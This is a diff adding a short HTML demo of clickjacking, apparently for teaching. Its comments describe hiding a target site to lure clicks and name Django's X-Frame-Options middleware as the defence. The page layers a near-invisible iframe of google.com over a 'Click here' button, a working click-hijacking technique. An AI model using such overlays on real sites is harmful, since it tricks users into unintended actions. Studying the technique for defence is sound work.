@@ -1,0 +1,31 @@
+<!-- Change the website invisible, lead user to click the button -->
+<!-- If opacity is 0, the trick is disabled -->
+<!-- User django.middleware.clickjacking.XFrameOptionsMiddleware -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>clickjacking</title>
+    <style type="text/css">
+
+        iframe{
+            width: 100%;
+            height: 1500px;
+            display: block;
+            position: absolute;
+            z-index: 2;
+            opacity: 0.01; 
+        }
+        button{
+            position: absolute;
+            top: 364px;
+            left: 440px;
+            z-index: 1;
+        }
+    </style>
+</head>
+<body>
+    <button>Click here</button>
+    <iframe src="https://www.google.com"></iframe>
+</body>
+</html>
